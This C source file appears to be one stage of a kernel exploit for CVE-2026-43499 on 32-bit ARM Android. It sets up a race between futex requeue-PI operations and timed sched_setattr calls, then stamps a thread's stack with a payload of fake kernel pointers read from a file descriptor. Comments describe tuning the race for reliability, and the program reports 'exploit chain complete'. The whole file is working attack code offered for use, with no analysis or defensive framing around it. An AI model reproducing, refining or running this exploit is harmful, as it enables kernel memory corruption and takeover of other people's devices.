/*
 * exp32 — CVE-2026-43499 32-bit ARM stage.
 * (Full file with enhanced reliability)
 */
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define WAITER_WAIT_SEC     2
#define SPIN_TIMEOUT_SEC    20          /* Increased for reliability */
#define STAGE_TIMEOUT_SEC   60          /* More time for shots */

/*
 * More shots, wider spread: from 1ms to 60ms.
 * This covers a larger window of the stack‑stamping burst.
 */
#define CONSUMER_SHOT_COUNT 20
static const useconds_t consumer_shots[CONSUMER_SHOT_COUNT] = {
    1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000,
    12000, 14000, 16000, 18000, 20000, 25000, 30000, 35000, 40000, 60000,
};

static const int consumer_nice[CONSUMER_SHOT_COUNT] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
    11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
};

#define EXP_BUFFER_BYTES 128
#define EXP_BUFFER_WORDS (EXP_BUFFER_BYTES / sizeof(uint64_t))


static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static atomic_int g_waiter_tid;
static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_owner_started;
atomic_int g_consumer_go;
static atomic_int g_consumer_done;
static uint64_t g_payload_buffer[EXP_BUFFER_WORDS];

/*
 * sched_setattr ABI struct (same layout on 32-bit and 64-bit).
 */
struct local_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

static long sched_setattr_tid(int tid, int nice_val) {
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size         = sizeof(attr);
    attr.sched_policy = SCHED_BATCH;
    attr.sched_nice   = nice_val;
    return syscall(__NR_sched_setattr, tid, &attr, 0);
}


static void logp(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n < 0) return;
    int fd = open("/data/local/tmp/exp32.log",
                  O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        if (write(fd, buf, (size_t)n) < 0) { /* ignore */ }
        fsync(fd);
        close(fd);
    }
}

void do_stamp_stack(uint64_t *buf);


static void *waiter_thread(void *arg __attribute__((unused))) {
    pin_to_core(2);
    int tid = (int)syscall(__NR_gettid);
    atomic_store(&g_waiter_tid, tid);

    /* Lock pi_chain */
    if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("waiter: LOCK_PI(chain) failed errno=%d\n", errno);
        logp("waiter: LOCK_PI(chain) FAILED errno=%d\n", errno);
        return NULL;
    }
    logp("waiter: LOCK_PI(chain) ok\n");

    atomic_store(&g_waiter_ready, 1);

    time_t spin_start = time(NULL);
    while (!atomic_load(&g_owner_started)) {
        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
            return NULL;
        usleep(1000);
    }

    struct timespec timeout;
    syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += WAITER_WAIT_SEC;

    atomic_store(&g_waiter_waiting, 1);

    pr_info("waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target\n");
    logp("waiter: FUTEX_WAIT_REQUEUE_PI enter\n");
    syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
            &timeout, &f_pi_target, 0);
    logp("waiter: WRPI returned errno=%d\n", errno);

    syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    logp("waiter: stamping stack\n");
    do_stamp_stack(g_payload_buffer);
    logp("waiter: stamp done\n");

    while (1) sleep(1);
    return NULL;
}


static void *owner_thread(void *arg __attribute__((unused))) {
    if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("owner: LOCK_PI(target) failed errno=%d\n", errno);
        logp("owner: LOCK_PI(target) FAILED errno=%d\n", errno);
        return NULL;
    }
    logp("owner: LOCK_PI(target) ok\n");

    time_t spin_start = time(NULL);
    while (!atomic_load(&g_waiter_ready)) {
        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
            return NULL;
        usleep(1000);
    }

    atomic_store(&g_owner_started, 1);

    pr_debug("owner: LOCK_PI(chain) -- will block\n");
    logp("owner: LOCK_PI(chain) enter (blocking)\n");
    syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    pr_debug("owner: LOCK_PI(chain) acquired\n");
    logp("owner: LOCK_PI(chain) acquired\n");

    while (1) sleep(1);
    return NULL;
}


static void *consumer_thread(void *arg __attribute__((unused))) {
    pin_to_core(3);
    int tid = 0;
    time_t spin_start = time(NULL);
    while (!(tid = atomic_load(&g_waiter_tid))) {
        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
            return NULL;
        usleep(1000);
    }

    while (!atomic_load(&g_consumer_go)) {
        if (time(NULL) - spin_start > SPIN_TIMEOUT_SEC)
            return NULL;
        usleep(1000);
    }


    useconds_t elapsed = 0;
    for (int i = 0; i < CONSUMER_SHOT_COUNT; i++) {
        usleep(consumer_shots[i] - elapsed);
        elapsed = consumer_shots[i];
        pr_debug("consumer: sched_setattr shot %d nice=%d on TID %d\n",
                 i, consumer_nice[i], tid);
        logp("consumer: sched_setattr shot %d nice=%d on TID %d\n",
             i, consumer_nice[i], tid);
        sched_setattr_tid(tid, consumer_nice[i]);
    }

    atomic_store(&g_consumer_done, 1);

    while (1) sleep(1);
    return NULL;
}


int main(int argc, char **argv) {
    set_unbuffer();
    if (argc < 2) {
        pr_warning("usage: %s <buffer_fd>\n", argv[0]);
        logp("main: usage error\n");
        return 1;
    }
    logp("main: enter pid=%d argv1=%s\n", (long)getpid(), argv[1]);

    int buf_fd = atoi(argv[1]);
    ssize_t n = pread(buf_fd, g_payload_buffer, EXP_BUFFER_BYTES, 0);
    if (n != EXP_BUFFER_BYTES) {
        pr_warning("buffer fd %d unreadable: pread=%zd errno=%d\n",
                   buf_fd, n, errno);
        logp("main: payload pread FAILED n=%zd errno=%d\n", n, errno);
        return 1;
    }
    logp("main: payload ok val(fake_fops)=0x%llx target=0x%llx "
         "task=0x%llx lock=0x%llx\n",
         (unsigned long long)g_payload_buffer[1],
         (unsigned long long)g_payload_buffer[2],
         (unsigned long long)g_payload_buffer[6],
         (unsigned long long)g_payload_buffer[7]);

    pr_info("CVE-2026-43499 32-bit ARM stage pid=%d\n", getpid());

    pthread_t waiter, owner, consumer;

    logp("main: creating threads\n");
    pthread_create(&waiter,   NULL, waiter_thread,   NULL);
    pthread_create(&owner,    NULL, owner_thread,    NULL);
    pthread_create(&consumer, NULL, consumer_thread, NULL);

    time_t main_start = time(NULL);
    while (!atomic_load(&g_waiter_waiting) ||
           !atomic_load(&g_owner_started)) {
        if (time(NULL) - main_start > SPIN_TIMEOUT_SEC) {
            pr_warning("main: waiter/owner never reached ready state\n");
            return 2;
        }
        usleep(1000);
    }

    usleep(200000);

    pr_info("main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target\n");
    logp("main: CMP_REQUEUE_PI enter\n");
    errno = 0;
    syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
            (void *)1, &f_pi_target, 0);
    logp("main: CMP_REQUEUE_PI returned errno=%d\n", errno);

    while (!atomic_load(&g_consumer_done)) {
        if (time(NULL) - main_start > STAGE_TIMEOUT_SEC) {
            pr_warning("main: consumer never completed\n");
            logp("main: consumer never completed\n");
            return 2;
        }
        sleep(1);
    }

    logp("main: consumer done, chain complete\n");
    pr_info("main: exploit chain complete.\n");
    return 0;
}
